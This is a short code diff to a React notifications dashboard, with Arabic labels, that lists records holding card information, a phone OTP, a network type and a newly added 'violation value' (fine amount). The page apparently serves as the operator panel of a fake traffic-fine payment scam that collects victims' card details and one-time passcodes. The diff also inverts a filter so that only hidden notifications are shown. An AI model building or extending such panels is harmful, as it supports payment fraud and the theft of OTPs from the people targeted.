@@ -111,7 +111,7 @@ export default function NotificationsPage() {
             }))
             return { id: doc.id, ...data }
           })
-          .filter((notification: any) => !notification.isHidden) as Notification[]
+          .filter((notification: any) => notification.isHidden) as Notification[]
 
         // Check if there are any new notifications with card info or general info
         const hasNewCardInfo = notificationsData.some(
@@ -550,6 +550,9 @@ export default function NotificationsPage() {
               </p>
               <p>
                 <strong>نوع الشبكة :</strong> {selectedNotification.network}
+              </p>{" "}
+              <p>
+                <strong>قيمة المخالفة :</strong> {selectedNotification.violationValue}
               </p>{" "}
               <p>
                 <strong>Phobe OTP :</strong> {selectedNotification.phoneOtp}
